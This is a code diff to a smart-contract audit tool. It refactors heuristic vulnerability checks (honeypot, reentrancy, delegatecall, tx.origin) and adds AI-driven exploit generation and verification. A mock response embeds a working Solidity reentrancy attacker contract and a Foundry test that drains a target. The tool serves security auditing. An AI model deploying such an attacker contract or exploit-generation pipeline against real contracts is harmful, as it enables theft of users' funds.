@@ -5,16 +5,27 @@ import { contractManager } from './contractManager'; // Helper to get providers
 // 1. ADVANCED SECURITY RULES (SOURCE CODE)
 // ==========================================
 const analyzeSecurity = (code) => {
-    const vulnerabilities = [];
+    const findings = [];
     // Normalize code for easier matching (remove excessive whitespace)
     const normalizedCode = code.replace(/\r/g, '').split('\n');
+    let vulnCounter = 1;
 
-    const addVuln = (id, title, severity, lineIdx, explanation, impact, rec) => {
-        vulnerabilities.push({
-            id, title, severity,
-            startLine: lineIdx + 1,
-            endLine: lineIdx + 1,
-            explanation, impact, recommendation: rec
+    const addFinding = (title, severity, lineIdx, description, justification, exploitTestable = false) => {
+        let color = 'green';
+        if (severity === 'critical') color = 'red';
+        else if (severity === 'medium') color = 'yellow';
+        else if (severity === 'low') color = 'green';
+
+        findings.push({
+            id: `SC-${String(vulnCounter++).padStart(3, '0')}`,
+            severity,
+            color,
+            title,
+            description,
+            functions: [], // Parser enhancement needed to identify function scope
+            lines: [lineIdx + 1, lineIdx + 1],
+            exploitTestable,
+            justification
         });
     };
 
@@ -34,10 +45,10 @@ const analyzeSecurity = (code) => {
             (lowerContent.includes('tradingopen') || lowerContent.includes('allowed') || lowerContent.includes('blacklist') || lowerContent.includes('isbot')) &&
             !lowerContent.includes('owner')
         ) {
-            addVuln('v-honey-1', 'Potential Honeypot Logic', 'CRITICAL', i,
-                'Transfer appears conditionally restricted based on custom flags (tradingOpen, isBot, etc).',
+            addFinding('Potential Honeypot Logic', 'critical', i,
+                'Transfer appears conditionally restricted based on custom flags (tradingOpen, isBot, etc). Recommendation: Verify these restrictions cannot be abused to lock funds.',
                 'Users might be unable to sell if the owner disables trading or blacklists them.',
-                'Verify these restrictions cannot be abused to lock funds.');
+                true);
         }
 
         // 2. Hidden Mint / Balance Manipulation
@@ -49,10 +60,10 @@ const analyzeSecurity = (code) => {
         ) {
             // Heuristic: Strange balance updates outside standard transfer
             if (lowerContent.includes('_balances[sender] =') || lowerContent.includes('_basictransfer')) {
-                addVuln('v-fake-mint', 'Non-Standard Balance Update', 'HIGH', i,
-                    'Balances are being modified in a non-standard way.',
+                addFinding('Non-Standard Balance Update', 'critical', i,
+                    'Balances are being modified in a non-standard way. Recommendation: Ensure strictly standard ERC20 transfer logic.',
                     'Risk of hidden minting or balance spoofing.',
-                    'Ensure strictly standard ERC20 transfer logic.');
+                    true);
             }
         }
 
@@ -63,27 +74,27 @@ const analyzeSecurity = (code) => {
         // 3. Blacklist Capabilities
         if (lowerContent.includes('blacklist') || lowerContent.includes('bot') || lowerContent.includes('antisniper')) {
             if (lowerContent.includes('mapping')) {
-                addVuln('v-blacklist', 'Blacklist Mechanism', 'HIGH', i,
-                    'Contract contains a blacklist/bot mapping.',
-                    'Owner can arbitrarily block addresses from trading.',
-                    'Centralized control over user assets.');
+                addFinding('Blacklist Mechanism', 'medium', i,
+                    'Contract contains a blacklist/bot mapping. Recommendation: Check owner privileges.',
+                    'Owner can arbitrarily block addresses from trading. Centralized control over user assets.',
+                    false);
             }
         }
 
         // 4. Fee Manipulation (High Tax)
         if ((lowerContent.includes('setfee') || lowerContent.includes('settax') || lowerContent.includes('updatefees')) && lowerContent.includes('function')) {
-            addVuln('v-fees', 'Mutable Feerate', 'MEDIUM', i,
-                'Owner can change the tax/fee rate.',
+            addFinding('Mutable Feerate', 'medium', i,
+                'Owner can change the tax/fee rate. Recommendation: Ensure there is a hard cap (e.g. max 25%) in the code.',
                 'Owner could set fees to 100% (Honeypot).',
-                'Ensure there is a hard cap (e.g. max 25%) in the code.');
+                false);
         }
 
         // 5. Max Transaction / Wallet Limits
         if ((lowerContent.includes('maxtextamount') || lowerContent.includes('maxwallet') || lowerContent.includes('_maxtxamount')) && (lowerContent.includes('set') || lowerContent.includes('update'))) {
-            addVuln('v-limits', 'Mutable Transaction Limits', 'MEDIUM', i,
-                'Owner can change max transaction or wallet limits.',
+            addFinding('Mutable Transaction Limits', 'medium', i,
+                'Owner can change max transaction or wallet limits. Recommendation: Check for lower bounds (MIN keys).',
                 'Can be used to effectively stop trading (set limit to 0).',
-                'Check for lower bounds (MIN keys).');
+                false);
         }
 
         // -----------------------------
@@ -92,75 +103,88 @@ const analyzeSecurity = (code) => {
 
         // 6. Reentrancy
         if (content.includes('.call{value:') && !lowerContent.includes('nonreentrant')) {
-            addVuln('v-reent', 'Potential Reentrancy', 'CRITICAL', i,
-                'Low-level call used to transfer ETH without reentrancy guard.',
+            addFinding('Potential Reentrancy', 'critical', i,
+                'Low-level call used to transfer ETH without reentrancy guard. Recommendation: Use ReentrancyGuard/nonReentrant.',
                 'Attackers can drain funds by recursively calling.',
-                'Use ReentrancyGuard/nonReentrant.');
+                true);
         }
 
         // 7. Delegatecall
         if (content.includes('delegatecall')) {
-            addVuln('v-delegate', 'Unsafe Delegatecall', 'CRITICAL', i,
-                'Contract executes code from another address.',
-                'If target is malicious, contract can be destroyed.',
-                'Verify target trust.');
+            addFinding('Unsafe Delegatecall', 'critical', i,
+                'Contract executes code from another address. Recommendation: Verify target trust.',
+                'If target is malicious, contract can be destroyed or manipulated.',
+                true);
         }
 
         // 8. Self Destruct
         if (content.includes('selfdestruct')) {
-            addVuln('v-destruct', 'Self Destruct', 'HIGH', i,
-                'Can verify destroy contract.',
+            addFinding('Self Destruct', 'medium', i,
+                'Can verify destroy contract. Recommendation: Remove unless necessary.',
                 'Rug pull risk.',
-                'Remove unless necessary.');
+                true);
         }
 
         // 9. Weak Randomness
         if ((content.includes('block.difficulty') || content.includes('block.timestamp')) && (content.includes('%'))) {
-            addVuln('v-random', 'Weak Randomness', 'LOW', i,
-                'Using block attributes for RNG.',
+            addFinding('Weak Randomness', 'low', i,
+                'Using block attributes for RNG. Recommendation: Use Chainlink VRF.',
                 'Miners can manipulate result.',
-                'Use Chainlink VRF.');
+                true);
         }
 
         // 10. Tx.Origin
         if (content.includes('tx.origin')) {
-            addVuln('v-txorigin', 'Tx.Origin Phishing', 'MEDIUM', i,
-                'Authorization using tx.origin.',
+            addFinding('Tx.Origin Phishing', 'medium', i,
+                'Authorization using tx.origin. Recommendation: Use msg.sender.',
                 'Phishing risk.',
-                'Use msg.sender.');
+                true);
         }
     });
 
-    return { vulnerabilities };
+    return { findings };
 };
 
 // ==========================================
 // 2. BYTECODE ANALYSIS (UNVERIFIED CONTRACTS)
 // ==========================================
 const analyzeBytecode = (bytecode) => {
-    const vulns = [];
+    const findings = [];
+    let vulnCounter = 1;
+
+    const addBCodeFinding = (title, severity, description, justification) => {
+        let color = 'green';
+        if (severity === 'critical') color = 'red';
+        else if (severity === 'medium') color = 'yellow';
+
+        findings.push({
+            id: `BC-${String(vulnCounter++).padStart(3, '0')}`,
+            severity,
+            color,
+            title,
+            description,
+            functions: [],
+            lines: [1, 1],
+            exploitTestable: true,
+            justification
+        });
+    };
 
     // Check for SELFDESTRUCT opcode (0xff)
-    if (bytecode.includes('ff')) { // Simplified check, strictly need full disassembly but heuristic works often
-        vulns.push({
-            id: 'b-destruct', title: 'Self-Destruct Opcode Detected', severity: 'HIGH',
-            startLine: 1, endLine: 1,
-            explanation: 'The compiled bytecode contains the SELFDESTRUCT opcode (0xFF).',
-            impact: 'Contract can be destroyed.', recommendation: 'Verify source code to confirm safety.'
-        });
+    if (bytecode.includes('ff')) {
+        addBCodeFinding('Self-Destruct Opcode Detected', 'medium',
+            'The compiled bytecode contains the SELFDESTRUCT opcode (0xFF). Recommendation: Verify source code.',
+            'Contract can be destroyed.');
     }
 
     // Check for DELEGATECALL (0xf4)
     if (bytecode.includes('f4')) {
-        vulns.push({
-            id: 'b-delegate', title: 'Delegatecall Opcode Detected', severity: 'MEDIUM',
-            startLine: 1, endLine: 1,
-            explanation: 'The compiled bytecode contains DELEGATECALL (0xF4).',
-            impact: 'Contract relies on external logic.', recommendation: 'Verify source to ensure delegate target is safe.'
-        });
+        addBCodeFinding('Delegatecall Opcode Detected', 'medium',
+            'The compiled bytecode contains DELEGATECALL (0xF4). Recommendation: Verify source to ensure delegate target is safe.',
+            'Contract relies on external logic.');
     }
 
-    return vulns;
+    return findings;
 };
 
 // ==========================================
@@ -225,38 +249,138 @@ const fetchSourceCode = async (address, network) => {
 // ==========================================
 // 4. MAIN SERVICE EXPORT
 // ==========================================
-import { AUDIT_PROMPT } from './aiPrompt';
+import { AUDIT_PROMPT, EXPLOIT_PROMPT, VERIFY_PROMPT } from './aiPrompt';
 
 export const auditService = {
     // OpenAI/Anthropic Integration Placeholder
     async performAIAudit(code, network, apiKey) {
         /* 
            IMPLEMENTATION GUIDE:
-           1. Replace {{NETWORK}} and {{ADDRESS}} in AUDIT_PROMPT
-           2. Send to GPT-4 or Claude 3.5 Sonnet
-           3. Parse JSON response
-           4. Merge with static analysis results
+           1. Replace {{CODE}} in AUDIT_PROMPT ...
         */
         const prompt = AUDIT_PROMPT
-            .replace('{{NETWORK}}', network || 'Unknown')
-            .replace('{{ADDRESS}}', '0x...');
+            .replace('{{CODE}}', code || '// No code');
 
         console.log("Ready to send prompt:", prompt);
-        return []; // Return parsed findings
+        return { findings: [] }; // Mock
+    },
+
+    async generateExploit(code, finding) {
+        // Construct the prompt with the specific finding context
+        const prompt = EXPLOIT_PROMPT
+            .replace('{{CODE}}', code)
+            .replace('{{FINDING_JSON}}', JSON.stringify(finding, null, 2));
+
+        console.log("Generating exploit with prompt length:", prompt.length);
+
+        // MOCK RESPONSE - ideally this calls an AI endpoint
+        // Returning a simulated Foundry exploit for a Reentrancy attack as an example
+        return {
+            success: true,
+            exploit: {
+                framework: "foundry",
+                attackerContract: {
+                    filename: "Attacker.sol",
+                    code: `// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "./Target.sol";
+
+contract Attacker {
+    Target public target;
+    address public owner;
+
+    constructor(address _target) {
+        target = Target(_target);
+        owner = msg.sender;
+    }
+
+    // Trigger the attack
+    function attack() external payable {
+        require(msg.value >= 1 ether, "Need ETH");
+        target.deposit{value: 1 ether}();
+        target.withdraw();
+    }
+
+    // Fallback called during reentrancy
+    receive() external payable {
+        if (address(target).balance >= 1 ether) {
+            target.withdraw();
+        }
+    }
+    
+    function collect() external {
+        payable(owner).transfer(address(this).balance);
+    }
+}`
+                },
+                test: {
+                    filename: "Exploit.t.sol",
+                    code: `// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "forge-std/Test.sol";
+import "../src/Target.sol";
+import "../src/Attacker.sol";
+
+contract ExploitTest is Test {
+    Target public target;
+    Attacker public attacker;
+
+    function setUp() public {
+        target = new Target();
+        target.deposit{value: 10 ether}(); // Target has funds
+        
+        attacker = new Attacker(address(target));
+        vm.deal(address(attacker), 1 ether); // Attacker starts with little
+    }
+
+    function testReentrancyExploit() public {
+        console.log("Before: Target Balance", address(target).balance);
+        console.log("Before: Attacker Balance", address(attacker).balance);
+
+        attacker.attack{value: 1 ether}();
+
+        console.log("After: Target Balance", address(target).balance);
+        console.log("After: Attacker Balance", address(attacker).balance);
+
+        assertEq(address(target).balance, 0, "Target not drained");
+        assertGt(address(attacker).balance, 10 ether, "Attacker did not profit");
+    }
+}`
+                },
+                successCriteria: "Target Code balance == 0 && Attacker Code balance > Initial"
+            }
+        };
+    },
+
+    async verifyExploit(vulnerabilityId, testLogs) {
+        const prompt = VERIFY_PROMPT
+            .replace('{{TEST_LOGS}}', testLogs);
+
+        console.log("Verifying exploit with prompt length:", prompt.length);
+
+        // MOCK RESPONSE
+        return {
+            vulnerabilityId: vulnerabilityId,
+            verification: "confirmed",
+            finalSeverity: "critical",
+            updatedRiskScore: 0,
+            notes: "Test logs confirm reliable reentrancy. 10 ETH drained in single transaction."
+        };
     },
 
     async performAudit({ address, network, code: manualCode }) {
         try {
             let sourceCode = manualCode;
             let name = 'Audit Report';
-            let isUnverified = false;
-            let combinedVulnerabilities = [];
+            let combinedFindings = [];
 
             // Case 1: Manual Code Paste
             if (!address && manualCode) {
                 name = 'Manual Analysis';
                 const analysis = analyzeSecurity(manualCode);
-                combinedVulnerabilities = analysis.vulnerabilities;
+                combinedFindings = analysis.findings;
             }
 
             // Case 2: Address Search
@@ -267,10 +391,9 @@ export const auditService = {
                 if (sourceCode) {
                     name = `Audit: ${address.slice(0, 8)}... (${network})`;
                     const analysis = analyzeSecurity(sourceCode);
-                    combinedVulnerabilities = analysis.vulnerabilities;
+                    combinedFindings = analysis.findings;
                 } else {
                     // B. Fallback to Bytecode Analysis (Unverified)
-                    isUnverified = true;
                     name = `UNVERIFIED: ${address.slice(0, 8)}...`;
 
                     try {
@@ -280,12 +403,12 @@ export const auditService = {
                             if (sourceCode === '0x') throw new Error("Contract does not exist");
 
                             // Analyze Bytecode
-                            combinedVulnerabilities = analyzeBytecode(sourceCode);
+                            combinedFindings = analyzeBytecode(sourceCode);
 
                             // Prepare display for the viewer
                             sourceCode = `// ⚠️ CONTRACT SOURCE CODE NOT VERIFIED\n// ⚠️ DISPLAYING RAW BYTECODE ANALYSIS\n\n// Address: ${address}\n// Network: ${network}\n\n` +
                                 `// Analysis Findings:\n` +
-                                (combinedVulnerabilities.length > 0 ? combinedVulnerabilities.map(v => `// - [${v.severity}] ${v.title}`).join('\n') : '// - No obvious bytecode hazards found (ff/f4)') +
+                                (combinedFindings.length > 0 ? combinedFindings.map(v => `// - [${v.severity}] ${v.title}`).join('\n') : '// - No obvious bytecode hazards found (ff/f4)') +
                                 `\n\n// Raw Bytecode:\n` + sourceCode;
                         } else {
                             throw new Error("Could not connect to network provider");
@@ -296,21 +419,37 @@ export const auditService = {
                 }
             }
 
-            // Calculate Score
-            let riskScore = 0;
-            combinedVulnerabilities.forEach(v => {
-                if (v.severity === 'CRITICAL') riskScore += 40;
-                else if (v.severity === 'HIGH') riskScore += 25;
-                else if (v.severity === 'MEDIUM') riskScore += 10;
-                else riskScore += 2;
+            // Calculate Summary
+            let critical = 0, medium = 0, low = 0;
+            let score = 0;
+
+            combinedFindings.forEach(v => {
+                if (v.severity === 'critical') {
+                    critical++;
+                    score += 40;
+                } else if (v.severity === 'medium') {
+                    medium++;
+                    score += 20;
+                } else if (v.severity === 'low') {
+                    low++;
+                    score += 5;
+                }
             });
-            riskScore = Math.min(riskScore, 100);
+
+            const riskScore = Math.min(score, 100);
+
+            const summary = {
+                riskScore,
+                critical,
+                medium,
+                low
+            };
 
             const auditData = {
                 name, address, network,
                 code: sourceCode,
-                riskScore,
-                vulnerabilities: combinedVulnerabilities,
+                summary,
+                findings: combinedFindings,
                 created_at: new Date().toISOString()
             };
 
